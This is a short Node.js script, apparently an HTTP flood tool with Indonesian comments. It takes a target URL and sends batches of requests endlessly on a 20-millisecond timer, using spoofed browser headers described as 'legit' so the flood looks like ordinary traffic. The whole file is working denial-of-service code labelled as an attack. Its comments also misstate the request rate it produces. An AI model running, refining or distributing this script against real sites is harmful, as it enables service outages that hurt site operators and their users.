const os = require('os');
//const fetch = require('node-fetch'); // Pastikan node-fetch sudah terinstall
const target = process.argv[2];

if (!target) {
    console.log('Invalid Usage: node h1hold.js <URL>');
    process.exit(1);
}

// Headers legit
const headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
};

// Fungsi serangan
function attack(target, headers) {
    fetch(target, { headers })
        .then(response => console.log(`Request sent to ${target}, Status: ${response.status}`))
        .catch(err => console.error(`Error: ${err.message}`));
}

// Menghitung jumlah core CPU
const numCPUs = os.cpus().length;
const targetCPUUsage = 0.1; // 10% dari total CPU usage
const targetRequestsPerSecond = Math.floor(60 * targetCPUUsage); // Jumlah request per detik berdasarkan 10% CPU

console.log(`Starting attack targeting 10% CPU usage, sending approximately ${targetRequestsPerSecond} requests per second...`);

// Serangan tanpa henti dengan kontrol CPU
setInterval(() => {
    for (let i = 0; i < targetRequestsPerSecond; i++) {
        attack(target, headers);
    }
}, 20); // Kirim requests per detik sesuai target CPU usage
